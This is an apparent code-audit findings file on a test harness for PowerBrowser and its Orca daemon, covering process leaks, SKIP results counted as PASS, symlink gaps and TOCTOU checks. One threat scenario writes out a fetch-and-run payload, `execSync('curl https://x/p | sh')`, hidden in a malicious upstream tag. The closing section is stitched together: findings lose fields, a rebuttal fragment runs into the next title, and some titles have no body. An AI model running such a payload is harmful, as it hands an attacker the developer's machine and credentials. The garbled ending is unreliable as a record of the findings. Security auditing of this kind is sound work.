findings.title: orcad started through orca-run.mjs leaks when startOrcad rejects or the row is interrupted, and the leak leg cannot see it
findings.description: startOrcad spawns orcad with detached: true, which puts it in its own session and process group. On its timeout or ready-line parse failure it rejects without killing the child, and attaches the child only as error.child. Three callers ignore error.child: verify-orca-credential-store-live.mjs:146 (const started = await startOrcad(...)), verify-orca-browser-host-bundle.mjs:406 (run stays null, so the finally skips stopOrcad), and lib/orca-pane-harness.mjs:169 (child stays null). Only slotless-start and packaged-live recover it. When the driver interrupts a row, cleanup() sends `kill -- -$CURRENT_CHECK_PID`, which never reaches a detached orcad. The row's node then dies on SIGTERM without running its finally (liveHome's handler re-raises the signal), so orcad and its terminal daemon survive. The 2026-11-16 leak leg cannot catch any of this: it runs only while the row's own process group still has a member (`kill -0 -- -PGID`), and it only lists orcads whose session id equals the row's session.
findings.scenario: orca-credential-store-live on a slow host: the control orcad needs more than 60 s to print orca_server_ready. startOrcad rejects, the row prints FAIL and exits, and orcad keeps running on a loopback port with its data root under /tmp until reboot. A Ctrl-C during orca-browser-host-bundle or orca-pane-standalone-live has the same effect. Repeated gate runs accumulate orcad and terminal-daemon processes, and the driver's leak leg reports nothing, because nothing remains in the row's process group.
findings.evidence: lib/orca-run.mjs:179 `spawn(nodeBin, args, { cwd: profileDir, env: liveEnv(env), detached: true, ... })`; :186-187 `const fail = (msg) => finish(rejectP, Object.assign(new Error(redact(msg)), { child, ... })); const timer = setTimeout(() => fail(`orcad printed no orca_server_ready line within ${timeoutMs} ms...`), timeoutMs);` (child is not killed). verify-orca-credential-store-live.mjs:146-151 `const started = await startOrcad(...); ... finally { await stopOrcad(started.child, ...) }`, so nothing is stopped on rejection. verify-orca-browser-host-bundle.mjs:406 `run = await startOrcad(...)` and :501 `if (run) { await stopOrcad(...) }`. Driver :6981 `if kill -0 -- "-$CURRENT_CHECK_PID" 2>/dev/null && ! node .../verify-orcad-leak.mjs --session "$CURRENT_CHECK_PID"`; verify-orcad-leak.mjs:48 `procs.filter((p) => p.sid === sid && ...)`.
findings.suggested_fix: In startOrcad, kill the child's process group (and the daemon pid if known) before rejecting. Register a process 'exit' and signal handler in orca-run.mjs that stops every orcad it started. Have the driver record the row's start ticks and run the leak leg unconditionally, matching orcad by an argument or working directory under the row's scratch roots (as stopStrays does) instead of by session, and also stop Orca's terminal daemon.

votes.reasoning: orca-run.mjs:179 spawns orcad with detached:true, which calls setsid. On timeout, parse error or exit, fail() at :186-187 rejects with error.child attached and never kills the child. verify-orca-credential-store-live.mjs:146 awaits startOrcad outside the try whose finally calls stopOrcad. verify-orca-browser-host-bundle.mjs:406 leaves run null, so the `if (run)` guard at :501 skips stopOrcad. orca-pane-harness.mjs:169 leaves child null. All three entry points call process.exit(...), so the parent ends while the detached orcad keeps running. The driver's leak leg (verify-platform.sh:6981) runs only if `kill -0 -- -PGID` finds a survivor in the row's group, and verify-orcad-leak.mjs:48 filters on sid === row session. A setsid'd orcad matches neither, so the leak is not seen. cleanup() at :139-143 signals only the row's group. On interrupt, firefox-bidi.mjs liveHome re-raises the signal after disposing HOME, so a finally may not run; that part depends on listener counts at runtime, but the timeout path is fully static. The impact is a leaked loopback test daemon and temp data on a failure path, which is harness hardening rather than a product defect.
votes.guard_or_evidence: scripts/lib/orca-run.mjs:179,186-187; scripts/verify-orca-credential-store-live.mjs:146-151; scripts/verify-orca-browser-host-bundle.mjs:406,501; scripts/lib/orca-pane-harness.mjs:169; scripts/verify-orcad-leak.mjs:48; scripts/verify-platform.sh:6981

findings.title: Survivors of a row's process group other than orcad are neither failed nor stopped
findings.description: When `kill -0 -- -PGID` shows that something of the row outlived it, the driver runs only the orcad leg. Any other survivor (a PowerBrowser, a Theia sidecar, a stub agent, an HTTP fixture server) is left running, the row is PASS, and CURRENT_CHECK_PID is cleared right away, so cleanup() on EXIT never signals that group. Survivors accumulate across a multi-hour gate and can hold ports or profile locks that later rows meet.
findings.scenario: A node live row whose withFirefoxPage teardown is skipped by a thrown error leaves its PowerBrowser and sidecar alive in its group. The leak leg finds no orcad argv and exits 0. The row is PASS, and the browser keeps running after the gate ends.

findings.suggested_fix: After the leak leg, send SIGTERM and then SIGKILL to the row's process group (`kill -- -$PGID`). Report the survivors' argv as a row note, or as a FAIL under --gate.

votes.reasoning: At verify-platform.sh:6979-6990, when `kill -0 -- -PGID` succeeds, the only action is verify-orcad-leak.mjs, and leaksIn (:47-49) signals only processes whose argv names the orcad entry. Any other survivor of the row's group is left alone. The self-test explicitly requires a non-orcad bystander to be left running (verify-orcad-leak.mjs 'live: the non-orcad survivor is left running'). row_ok stays 1 and CURRENT_CHECK_PID is cleared at :6990, so cleanup() never signals that group. The stated trigger, a withFirefoxPage teardown skipped by a throw, is speculative because that helper uses finally, but the driver behaviour is as described. This is harness hardening.

findings.title: live-scratch-home writes probe modules into scripts/lib, which is tracked and not ignored, during the quick gate
findings.description: runHelperChild writes a copy (sometimes a planted variant) of firefox-bidi.mjs to scripts/lib/.scratch-home-probe-<pid>-<n>.mjs and deletes it only when the child exits. If the parent is killed (the completion hook's 480 s limit, a driver SIGINT that reaches the group, or OOM), the file stays in a tracked source directory that is not gitignored. Later treeFiles() scans and any `git add -A` by an agent will pick it up. In the same way, an interrupted orcad-leak self-test leaves its detached orcad-shaped plants running (`setInterval(() => {}, 1e9)`, own session), because they are killed only in its finally.
findings.scenario: The quick gate is stopped during live-scratch-home-self-test. scripts/lib/.scratch-home-probe-12345-7.mjs remains as an untracked copy of firefox-bidi.mjs with, for example, the signal listener removed. An autonomous commit with -A stages it.

findings.suggested_fix: Write probes to a mkdtemp folder and import the helper there through a file URL with an import map. Alternatively add the probe pattern to .gitignore and sweep stale probes at start. Kill the orcad-leak plants from a process 'exit' and signal handler.

votes.reasoning: verify-live-scratch-home.mjs:212-213 writes scripts/lib/.scratch-home-probe-<pid>-<n>.mjs, and the only rmSync is inside the child's 'exit' listener (:222) in the parent. If the parent dies first (SIGKILL, OOM, or a group signal before the listener runs), the file stays. `git check-ignore` returns no match (rc=1), so the file is untracked and not ignored, and `git add -A` would stage it. The row is in --quick (verify-platform.sh:4127). The orcad-leak self-test plants are spawned detached and unref'd with setInterval forever, and are killed only in its finally, so an interrupted run leaves them running. Both need an interruption to occur. This is hardening.

findings.title: ng-027 change lets a reader on one boundary object be satisfied by a call through the other
findings.description: v1.7 widened the method call pattern to `(PowerBrowserAPI|PowerBrowserProcesses)\.name\(`. deriveReaders does not record which object a two-space-indented method belongs to. A dead PowerBrowserAPI reader is therefore counted as called when a same-named method is called on PowerBrowserProcesses, and the reverse. Today the PowerBrowserProcesses methods (spawnProcessExact, listProcessTree, addNamedReapBlocker, writePrivateFile, platform) share no reader name with PowerBrowserAPI, so the drift risk is low. This is the only one of the five hash-locked ng files whose v1.7 change loosens an assertion. ng-018 adds a wait (the following expects are unchanged), ng-023 and ng-067 tighten their checks, and ng-072 only wraps env in liveEnv.
findings.scenario: A later change adds `listProcessTree` to PowerBrowserAPI as a dead duplicate. Its only call site is `PowerBrowserProcesses.listProcessTree(`, which matches the widened pattern, and ng-027 stays green.
findings.evidence: scripts/verify-ng-027-reader-callers.mjs:75-77 `const method = /^ {2}(?:async )?([A-Za-z_$][\w$]*)\(...` then `readers.push({ kind: 'method', name: method[1], file: PBA_REL, line: i })` (no owner object); :96 `if (reader.kind === 'method') return new RegExp(`(?:PowerBrowserAPI|PowerBrowserProcesses)\\.${reader.name}\\(`);`
findings.suggested_fix: Record each method's owning object from the enclosing `export const X = Object.freeze({` span and build the call pattern from that object only. Add a self-test plant with the same name on both objects.

votes.reasoning: At scripts/verify-ng-027-reader-callers.mjs:75-77, deriveReaders records every two-space-indented reader method in PowerBrowserAPI.sys.mjs as {kind:'method', name, file, line}. It does not record which exported object the method belongs to. The same file also exports PowerBrowserAPI (line 398), PowerBrowserWebTabs, PowerBrowserTabHost, PowerBrowserProcesses (line 10990) and PowerBrowserOrcaHosting. At :96, callPattern accepts `PowerBrowserAPI.name(` or `PowerBrowserProcesses.name(` for any method reader. git log shows this widening came in dc800b31 (62-03); before it the pattern was `PowerBrowserAPI\.name\(` only. So a dead reader on one object is counted as called when a same-named method is called on the other object. The self-test covers a removed PowerBrowserProcesses call site (:211-212) and a planted PowerBrowserAPI reader with no caller (:213-215). It never plants the same name on both objects, so this drift is not covered. Today's state matches the finding: the only PowerBrowserProcesses reader-named method is listProcessTree (:11004), and PowerBrowserAPI has no reader with that name. Its callers are in OrcaService.sys.mjs:335 and :644. The widening was needed, because without it listProcessTree would be falsely red. The defect is only that the match does not check the owning object. Today this is latent hardening, so low.
votes.guard_or_evidence: scripts/verify-ng-027-reader-callers.mjs:77 pushes {kind:'method', name, file, line} with no owner field. :96 is `new RegExp(`(?:PowerBrowserAPI|PowerBrowserProcesses)\\.${reader.name}\\(`)`. Commit dc800b31 changed it from `PowerBrowserAPI\\.` only. No self-test case plants a same name on both objects.

findings.title: macOS Orca merge plan skips symlinks, so they ship from the arm64 tree unchecked
findings.description: packagedFiles walks out/orcad and out/web with readdirSync(withFileTypes) and keeps only e.isFile(). Symbolic links (files or directories) are neither paired, compared nor reported. package-macos.sh orca-universal then does `cp -a "$arm/out/orcad" "$arm/out/web"`, so every symlink and its target come from the arm64 tree, and an x64-only or differing link disappears from the universal package without a FAIL. The self-test plants no symlink.
findings.scenario: An Orca re-pin ships out/orcad/node_modules as a pnpm-style tree whose native module paths are symlinks to arch-specific stores. The merge plan reports green with no pair for them, and the universal package carries only the arm64 binary behind the link, so orcad fails to load it on an x64 Mac.
findings.evidence: scripts/lib/orca-artifacts.mjs:95-96 `if (e.isDirectory()) walkDir(p); else if (e.isFile()) out.push(relative(root, p)...)`; powerbrowser/packaging/package-macos.sh:70 `cp -a "$arm/out/orcad" "$arm/out/web" "$out/out/"`.
findings.suggested_fix: Treat a symlink as a planned item: require identical link targets in both trees, or refuse with FAIL naming it. Add a symlink plant to the self-test.

votes.reasoning: At scripts/lib/orca-artifacts.mjs:92-96, packagedFiles calls readdirSync(dir,{withFileTypes:true}). Those Dirent types come from lstat, so a symlink is neither isDirectory() nor isFile() and is skipped. It is never paired, compared, or reported as present in one tree only. macosMergePlan (:118-145) therefore cannot FAIL on a symlink that exists only in the x64 tree, or on links whose targets differ between the trees. package-macos.sh orca_universal then runs `cp -a "$arm/out/orcad" "$arm/out/web" "$out/out/"`, so every link comes from the arm64 tree only. The x64 tree's links are never consulted. The self-test (:182-206) plants no symlink. One part of the scenario is overstated. With a pnpm-style layout whose links point into node_modules/.pnpm inside the same out/orcad tree, the real target files are still walked and in-place lipo-merged in $out, and the copied arm link then resolves to the merged file. The silent loss applies only to links that are x64-only, that differ between the trees, or that point outside out/orcad or out/web. I found no symlink, dereference or node-linker handling in orca's scripts or .npmrc, so nothing shows Orca's tree carries links today. This is a hardening gap in a packaging check, so low.
votes.guard_or_evidence: scripts/lib/orca-artifacts.mjs:95-96 is `if (e.isDirectory()) walkDir(p); else if (e.isFile()) out.push(...)`, and Dirent from readdirSync withFileTypes is lstat-based, so symlinks are skipped. powerbrowser/packaging/package-macos.sh orca_universal has `cp -a "$arm/out/orcad" "$arm/out/web" "$out/out/"`. Neither file contains isSymbolicLink or any symlink handling.

findings.title: Pin-derived security clauses SKIP in every CI job and the driver counts the SKIP as PASS; the Orca re-pin replay does not run them
findings.description: The clauses that tie PowerBrowser's RUN-09 refusal and protection sentence to the pinned orcad (override name and trigger value, isTemporaryKeyDir roots, written key-record backends) run only when orca/ is fetched. Without it they push one SKIP note and the script exits 0 with a PASS line. The same pattern holds for orca-failure-classes clause 3 (Orca's reason unions), orca-offer-file's decode agreement with Orca's parser, orca-service clause 9 (pinned codes and port) and orca-mobile-protocol, which SKIPs whole. verify.yml (the CI --quick gate) fetches upstream/ and builds theia/ but never runs fetch-orca.sh. The run loop in verify-platform.sh marks a row PASS on exit 0 and does not look for SKIP lines. rebase-orca.sh, the only job that checks out a new Orca tag, runs ROWS=(orca-build-shape orca-overlay orca-overlay-built orca-mobile-protocol licence-allowlist orca-mobile-skew). That list leaves out orca-credential-store, orca-failure-classes, orca-offer-file and orca-service, and its skip_line refusal applies only to the listed rows. The self-tests that need typescript (credential-store:254, failure-classes:267) or orca/ (mobile-skew-self-test:422) also print SKIP and return 0. The live rows orca-pairing-containment (line 257) and orca-offer-scan (line 159) return 0 on a SKIP when there is no build, and the driver counts that as PASS too.
findings.scenario: An Orca re-pin moves to a tag where orcad-secret-key-resolution.ts writes { backend: 'os-keyring' }, or renames ORCA_HEADLESS_SECRET_STORE. rebase-orca.yml replays green because its ROWS skip orca-credential-store. The bump PR's verify.yml run has no orca/, so orca-credential-store prints 'SKIP of the pinned-source clauses only' and is summarised as PASS. The PR merges while the privacy.html protection sentence and the plaintext refusal are false at the new pin. Only a developer who happens to run --quick with orca/ fetched later sees the red.
findings.evidence: scripts/verify-orca-credential-store.mjs:169-171 `if (!existsSync(paths.orcaDir) || !ts) { notes.push(`SKIP of the pinned-source clauses only -- ...`) }`, then main prints notes and `process.exit(0)` (lines 333-339). scripts/verify-orca-failure-classes.mjs:181-182 has the same branch. scripts/verify-orca-offer-file.mjs:214-215 `passes.push(`SKIP decode agreement ...`)`. scripts/verify-orca-service.mjs:979-980. scripts/verify-orca-mobile-protocol.mjs:175 returns {skip}, and render gives code 0. scripts/verify-platform.sh:6977-6986 `wait "$CURRENT_CHECK_PID" || row_ok=0 ... SUMMARY+=("$label: PASS")`. .github/workflows/verify.yml:79-93 runs only fetch-upstream/apply-patches, theia install/build, then `verify-platform.sh --quick` (no fetch-orca.sh). scripts/rebase-orca.sh:50 `ROWS=(orca-build-shape orca-overlay orca-overlay-built orca-mobile-protocol licence-allowlist orca-mobile-skew)`.
findings.suggested_fix: Add a fetch-orca.sh step (pinned tag and commit, no build) to verify.yml before the --quick table. Add orca-credential-store, orca-failure-classes, orca-offer-file and orca-service to rebase-orca.sh ROWS so the replay's skip_line refusal covers them. Make the driver treat a '<label>: SKIP' or 'SKIP of' line as red under --gate, or give these scripts a --require-pin flag that CI passes and that turns the SKIP into exit 1.

votes.reasoning:
I traced every step of the claim and each one holds.

1. scripts/verify-orca-credential-store.mjs:168-171 checks for orca/ and typescript. When either is missing it pushes the note 'SKIP of the pinned-source clauses only' and skips the derivePinned clauses: the override name and trigger value from orcad-secret-key-resolution.ts, the isTemporaryKeyDir roots, and the written backends. Main (lines 332-339) prints the notes and, with no fails, prints PASS and calls process.exit(0). The same named-SKIP branches exist in verify-orca-failure-classes.mjs:180-182 (clause 3, Orca's reasons), verify-orca-offer-file.mjs:214-215 (decode agreement), verify-orca-service.mjs:979-980 (clause 9, pinned source) and verify-orca-mobile-protocol.mjs:175 (a whole-check skip).
2. The run loop in verify-platform.sh (6973-6990) decides a row only from the exit status of `wait` plus the orcad leak leg. It never scans the output for SKIP, so these rows are recorded as "label: PASS".
3. verify.yml runs on push and pull_request. It fetches upstream/, applies patches, builds theia/ and runs `verify-platform.sh --quick`. No workflow step runs fetch-orca.sh; grep finds fetch-orca only in release.yml and release-train.yml. typescript is installed in that job, so orca/ is the missing input and the SKIP branch is taken. The release.yml jobs that do fetch orca/ run only packaged-tree rows (line 212: ng063-packaged-launch ... orca-packaged-tree) and verify-orca-packaged-tree.mjs, not these rows.
4. scripts/rebase-orca.sh:50 sets ROWS to orca-build-shape, orca-overlay, orca-overlay-built, orca-mobile-protocol, licence-allowlist and orca-mobile-skew. stage_rows (218-226) applies the skip_line refusal only to those rows. orca-credential-store, orca-failure-classes, orca-offer-file and orca-service are not in the list. rebase-orca.yml:106 calls only rebase-orca.sh, and the replay never runs --quick.

Result: during an Orca re-pin, the replay job is the one CI job that has the new orca/ tree, and it never runs the clauses that tie the RUN-09 refusal and the privacy sentence to the pin. The bump PR's verify.yml run has no orca/, so those clauses SKIP and the rows read PASS. The clauses do go red when a developer runs them locally with orca/ fetched, so the check is not dead everywhere. I found no guard, and no owner decision in DECISIONS.md that accepts this.

Why medium, not high: the trigger is an upstream Orca change, not an attacker-controlled input. The checks work when orca/ is present, so this is a CI coverage gap in a defence-in-depth gate that has a concrete path (a silent rename of the plaintext override, or a backend drift), not a check that can never go red.
votes.guard_or_evidence: scripts/verify-orca-credential-store.mjs:169-171 and 332-339 (SKIP note then exit 0 PASS); scripts/verify-platform.sh:6976-6990 (row PASS on exit status only); .github/workflows/verify.yml:79-93 (no fetch-orca.sh); scripts/rebase-orca.sh:50 and 218-226 (ROWS leaves out orca-credential-store, orca-failure-classes, orca-offer-file and orca-service; skip_line applies only to ROWS); .github/workflows/release.yml:211-213 (fetch-orca jobs run only packaged rows)

findings.title: orca-mobile-skew runs TypeScript fetched from an unpinned upstream tag on the developer machine
findings.description: The --skew row lists every tag on the Orca remote and picks the newest mobile-android-vX.Y.Z by version number. It partially clones that tag, reads mobile/src/transport/protocol-version.ts with git show, writes the text to a .mts file and loads it with dynamic import(). Loading the file runs its top-level code with the developer's full environment. Nothing ties the tag to a reviewed commit: fetch-orca.sh pins the desktop tag and commit, but this tag is whichever is newest at run time. The row is in the full tier (verify-platform.sh:6781), so every plain `scripts/verify-platform.sh` or `--gate` run on a developer machine does this. It also runs in rebase-orca.sh ROWS.
findings.scenario: Someone who can push a tag to github.com/stablyai/orca (a compromised maintainer account or a compromised upstream repo, threat actor f) pushes mobile-android-v99.0.0. Its protocol-version.ts starts with `import { execSync } from 'node:child_process'; execSync('curl https://x/p | sh');` and exports the two integers. The next full verify run on a developer machine imports the file and runs the payload as the developer, with access to ~/.claude, SSH keys and the Cloudflare token file. No re-pin or review is needed.
findings.evidence: scripts/verify-orca-mobile-protocol.mjs:304-307 newestAppTag sorts the remote's tags and takes the highest. :361-364 `execFileSync('git', [... 'clone', ..., '--branch', tag, remote, dir])` then `git show HEAD:<rel>`. :339-343 `writeFileSync(file, text); ... m = await import(pathToFileURL(file).href);`. scripts/verify-platform.sh:6781 `"orca-mobile-skew|node $REPO_ROOT/scripts/verify-orca-mobile-protocol.mjs --skew"`.
findings.suggested_fix: Do not execute the downloaded file. Get MOBILE_PROTOCOL_VERSION and MIN_COMPATIBLE_DESKTOP_VERSION with a strict regex or a TypeScript AST read of `export const NAME = <integer literal>`, and treat any other shape as 'constants file moved'. Keep import() only for the pinned tree's evaluateCompat.

votes.reasoning: I traced the whole path. runSkew (verify-orca-mobile-protocol.mjs:392-401) reads REMOTE from fetch-orca.sh, runs git ls-remote --tags, and newestAppTag (:304-308) takes the highest mobile-android-vX.Y.Z by integer order. Nothing pins it to a commit. appConstants (:361-364) does a depth-1 partial clone of that tag and git show HEAD:<rel>. constantsAt (:351-357) passes the text to importAppConstants (:339-343), which writes it to a .mts file and loads it with dynamic import(). Node type stripping runs the module's top-level code, a node:child_process import included, as the developer. Nothing sandboxes or vets the text before the import; the exports check comes only after it. The row is in the full tier (verify-platform.sh:6781) and in rebase-orca.sh:50 ROWS. The attacker must be able to push tags upstream (threat actor f), which is not the same as holding code execution on the developer machine: the desktop pin is commit-pinned and reviewed, and this tag is not.
votes.guard_or_evidence: scripts/verify-orca-mobile-protocol.mjs:304-308, 339-343, 351-364, 399-401; scripts/verify-platform.sh:6781; scripts/rebase-orca.sh:50

findings.title: runCollector turns a read() exception into a green sink whenever the control was found
findings.description: runCollector catches an exception from collector.read and sets unreadable = true, but leaves got as { chunks: [], faults: [] }. collectorLine reports unreadable only inside the blind branch. So when control() succeeds and read() throws, the result is 'control found, 0 matches' with no faults, which is green. Every needle and every fault that read() was building is discarded, including the bridge-folder mode faults and the stray-copy faults. The lib's own rule says an unread sink is never green, and this path breaks it.
findings.scenario: During the live pairing-containment run, bridgeFolderCollector runs while orcad is up. Its control reads web-pairing and passes. read() then lists the folder, and an entry is replaced between readdirSync and lstatSync (a writePrivateFile temp-then-rename, or the offer rewritten on reconnect), or a stray file is mode 0200, which passes the `(mode & 0o077) === 0` test, so readFileSync throws EACCES. read() throws, a 0644 web-pairing in the same folder or a second copy of the offer is never reported, and the sink prints 'sink bridge folder: control found, 0 matches'.
findings.evidence: scripts/lib/orca-offer-scan.mjs:222-224 `try { control = collector.control(ctx) === true; } catch { ... unreadable = true; } try { got = collector.read(ctx) ?? got; } catch { unreadable = true; } return { sink, blind: !control, matches: countMatches(got.chunks, ...), faults: got.faults ?? [], unreadable };`. :230 `if (r.blind) reasons.push(`collector blind (control not found${r.unreadable ? ', sink unreadable' : ''})`);` with no branch for `unreadable && !blind`. :436-442 bridgeFolderCollector.read calls lstatSync and readFileSync per entry without try/catch.
findings.suggested_fix: In collectorLine, push a red reason ('sink unreadable') whenever r.unreadable is true, whatever the control result. In bridgeFolderCollector.read, catch each entry's lstat or read error and record it as a named fault instead of throwing.

votes.reasoning: runCollector (orca-offer-scan.mjs:218-224) catches a read() throw, sets unreadable, and keeps got = { chunks: [], faults: [] }. collectorLine (:228-236) uses unreadable only inside the blind branch. With control true and read() throwing, the result has no reasons and the line reads 'control found, 0 matches' (green). report() in verify-orca-pairing-containment.mjs:350-363 never reads r.unreadable either, so no later guard catches it. bridgeFolderCollector.read (:425-447) calls lstatSync(bridgeDir), lstatSync per entry and readFileSync per stray with no try/catch, so an entry removed between readdirSync and lstatSync (ENOENT), or a 0200 stray (passes (mode & 0o077) === 0, then EACCES on read), throws and drops every fault it had built. Whether such a throw happens in a live run is a runtime question, but the defect itself, an unread sink reported green, is in the code as described.
votes.guard_or_evidence: scripts/lib/orca-offer-scan.mjs:218-236, 425-447; scripts/verify-orca-pairing-containment.mjs:350-363 (no unreadable check)

findings.title: Session-only pairing probe checks the absence of a hand-copied upstream localStorage key
findings.description: orca-offer-scan's main security assertion is that orca.web.runtimeEnvironment.v1, the key under which Orca's web client keeps its paired runtime environment, is absent from every 127.0.0.1 origin's localStorage (P65-17 session-only pairing). The key name is a literal in the lib, copied from orca/src/renderer/src/web/web-runtime-environment.ts:34 (ENVIRONMENT_STORAGE_KEY), and never derived from the pin. The scan reads only the key column (values may be compressed). pairing-containment's whole-profile scan excludes the Theia origin's storage folder as holder 4. So nothing else covers that origin. This is an absence assertion over a name that can only agree with the tree it was copied from.
findings.scenario: A re-pin brings an Orca version that bumps the key to orca.web.runtimeEnvironment.v2 and drops the session-only branch, so the paired environment, including its device credential, is written to the Theia origin's localStorage. orca-offer-scan still finds the marker key, finds no 'orca.web.runtimeEnvironment.v1', and passes. The whole-profile collector skips storage/default/http+++127.0.0.1+<theia port>. The persisted credential is reported nowhere.
findings.evidence: scripts/lib/orca-offer-scan.mjs:35 `export const RUNTIME_ENV_KEY = 'orca.web.runtimeEnvironment.v1';`. :151 `hasRuntimeKey: keys.includes(RUNTIME_ENV_KEY)`. :187 is the only verdict on it. orca/src/renderer/src/web/web-runtime-environment.ts:34 `const ENVIRONMENT_STORAGE_KEY = 'orca.web.runtimeEnvironment.v1'`. :373-375 profileFiles skips `storage/default/${ctx.theiaOriginDir}`.
findings.suggested_fix: Derive the key at check time from ENVIRONMENT_STORAGE_KEY in orca/src/renderer/src/web/web-runtime-environment.ts (red 'source moved' when absent), the way registryFilesFromPin derives holder 5. Better: require that the Theia origin's key set, minus the marker, is a subset of a set derived from the tree.

votes.reasoning: RUNTIME_ENV_KEY is a hand-copied literal (orca-offer-scan.mjs:35) that matches orca/src/renderer/src/web/web-runtime-environment.ts:34. No script derives it from the pin; grep finds no check that reads web-runtime-environment.ts. The literal is also copied in verify-orca-tabs-live.mjs:128 and verify-orca-pane-standalone-live.mjs:364. readOriginKeys reads only key names, and the only verdict on the key is at :187. profileFiles (:373-377) excludes storage/default/<theiaOriginDir>, so the whole-profile byte scan does not cover that origin. A key rename at re-pin would leave this check green, which breaks the CLAUDE.md derive-from-tree rule. Partial mitigation: other live rows assert state().pairing.sessionOnly === true and deviceKeySupport 'session-no-ed25519' (verify-orca-pane-standalone-live.mjs:145, verify-orca-workspace-live.mjs:298). That would catch the dropped session-only branch if state().pairing reflects Orca's stored environment, which I cannot settle statically. The scenario also needs an upstream change at a reviewed re-pin, so I rate it low.
votes.guard_or_evidence: scripts/lib/orca-offer-scan.mjs:35, 151, 187, 373-377; orca/src/renderer/src/web/web-runtime-environment.ts:34,85-91; partial: scripts/verify-orca-pane-standalone-live.mjs:145

findings.title: Logs sink control never travels the stdout/stderr capture path; a missing capture file reads as empty and the sink stays green
findings.description: The logs collector's control is 'orcad ready on ' in any log text. The live run takes that line from OrcaService.getRecentLog(), which it reads through chrome evaluation. PowerBrowser's stdout and stderr are tee'd to files through PB_LIVE_STDOUT_PATH/PB_LIVE_STDERR_PATH and then read with `captured()`, which returns '' when the file is absent or unreadable. So the control is found even when nothing from stdout or stderr was captured, and the sink is green without having seen either stream. This is the CLAUDE.md rule 1 failure: the control is not on the path it vouches for.
findings.scenario: A refactor of withFirefoxPage stops honouring the PB_LIVE_STDOUT_PATH default (the only consumer, scripts/lib/firefox-bidi.mjs:642), or the launch path stops going through it. stdout.log is never written, captured('stdout.log') returns ''. With devtools.console.stdout.content on, a console.log of the hand-off text in the Theia frontend would only show up in that stream. The logs sink still prints 'control found, 0 matches'.
findings.evidence: scripts/verify-orca-pairing-containment.mjs:309 `ctx.logTexts = [...diag.orcaLog, ...diag.theiaLog];` (contains the control). :333-334 `const captured = (f) => { try { return readFileSync(join(work, f), 'utf8'); } catch { return ''; } }; ctx.logTexts.push(captured('stdout.log'), captured('stderr.log'));`. scripts/lib/orca-offer-scan.mjs:398 `control: (ctx) => !!ctx.logControl && textsOf(ctx.logTexts).some((t) => t.includes(ctx.logControl))`.
findings.suggested_fix: Give each stream its own control: require that stdout.log exists and contains a line PowerBrowser always prints there (for example POWERBROWSER_SHELL_READY or a console marker the run writes on purpose), and that stderr.log exists. Turn a missing capture file into 'collector blind' instead of ''.

votes.reasoning: LOG_CONTROL is 'orcad ready on ' (verify-orca-pairing-containment.mjs:74). ctx.logTexts is filled first from OrcaService.getRecentLog()/TheiaService.getRecentLog() through chrome evaluation (:309), and the control is met from that source alone. stdout/stderr come from the PB_LIVE_STDOUT_PATH/STDERR_PATH tee (:270-271, consumed only by the default parameter in firefox-bidi.mjs:642). They are appended through captured() (:333-334), which returns '' for a missing or unreadable file. logsCollector.control (orca-offer-scan.mjs:398) is satisfied by the getRecentLog text, so a stdout/stderr capture that never happened still reads green. That is the control-not-on-the-vouched-path pattern. The tee currently works, and failure needs a future refactor, so this is hardening rather than a present hole.

findings.title: orca-offer-file's backend rule does not check the no-follow open or the lstat/fstat inode match that closes the TOCTOU window
findings.description: The backend rule requires an lstat and offerFileVerdict before the first read, and accepts any of readNoFollow, readFile, readFileSync, createReadStream or .open( as that read. The protection against the file being swapped for a symlink or another file between lstat and read lives in readNoFollow: O_NOFOLLOW plus an ino/dev comparison with the judged stat. The check does not inspect readNoFollow, and no self-test plant removes either part.
findings.scenario: A change replaces `text = await readNoFollow(full, stat)` with `text = await fs.promises.readFile(full, 'utf8')`, or deletes the `opened.ino !== judged.ino` comparison. orca-offer-file stays green, since lstat and the verdict still come before a matched read. A same-user process that renames a symlink to another file over web-pairing between the lstat and the read gets that file's contents returned as the offer.
findings.evidence: scripts/verify-orca-offer-file.mjs:225 `const firstRead = body.search(/\b(readNoFollow|readFile|readFileSync|createReadStream)\(|\.open\(/);`, and only order is asserted (:232-233). theia/extensions/orca-panes/src/node/orca-panes-backend-module.ts:107-111 `fs.promises.open(full, O_RDONLY | O_NOFOLLOW)` ... `if (!opened.isFile() || opened.ino !== judged.ino || opened.dev !== judged.dev)`.
findings.suggested_fix: Require that handOff's first read is readNoFollow(full, stat), and that readNoFollow's body opens with O_NOFOLLOW and compares ino and dev with the judged stat. Add plants for a plain readFile and for a removed inode comparison.

findings.title: orca-routes scan matches only a receiver literally named app, so a route on another receiver escapes the gate rule

A route registered on any other identifier (this.app, application, an express.Router() mounted later, a destructured `use`) is not seen, so its placement is never judged. First, `this.app.get(` does match `\bapp\.`, because '.' to 'a' is a word boundary, so that example is caught and judged. Second, and decisively, gate() is not tied to configure(). PowerBrowserTokenGateContribution.initialize unshifts gate into EarlyExpressMiddleware.handlers (token-gate-backend-contribution.ts:82), and Theia's BackendApplication.configure applies those handlers before any contribution's configure(app) (theia/node_modules/@theia/core/lib/node/backend-application.js:145-162). findings.title: orcad's fatal failure codes are a hand-kept pair; the checks prove only that each still exists in the pin
findings.description: OrcaService treats exactly ORCAD_PINNED_PORT_CODE and ORCAD_LOCK_HELD_CODE as unrecoverable, and maps them to port-in-use. orca-failure-classes derives its code set from OrcaEnv's own exports (the same source as the subject). orca-service clause 9 only greps the pin for those two strings. Neither derives orcad's code set from the pin and compares it as set equality. A new unrecoverable orcad code therefore goes unnoticed and is retried as a recoverable 'starting orcad' failure.
findings.scenario: A re-pin adds a fatal code such as 'orcad_data_root_unwritable' to orcad's startup errors. Both checks stay green. OrcaService retries orcad up to giveUpAttempts times, then shows could-not-start with Restart. Restart can never succeed for that code, and nothing goes red.

No check takes orcad's code set from the pin and compares it as a set. The gap is not only hypothetical. The current pin already has more fatal codes in the same union as the lock-held code: orca/src/main/orcad/orcad-data-root-privacy.ts:5-13 defines orcad_data_root_unusable, orcad_data_root_wrong_owner, orcad_data_root_shared, orcad_instance_lock_holder_unverifiable, orcad_instance_lock_foreign_identity and orcad_instance_lock_unreadable. findings.title: shell-request-kinds clause 3 finds a handler only when it is called on the same line as its case label

A case written as a block (`case "orcaFoo": {` with the return on the next line), or a handler with another name, is not collected. Its callers outside the walled switch are then never checked. Every other case is a block that does its work inline. The check fails as a broken instrument only when no handler is found (:150-152), and line 2332 keeps that from happening. findings.title: Raw-visibility structural clause matches only === and !== comparisons

findings.title: orca-build-shape and orca-pane-entry prove which tracked paths are modified, not that they hold the declared patch result
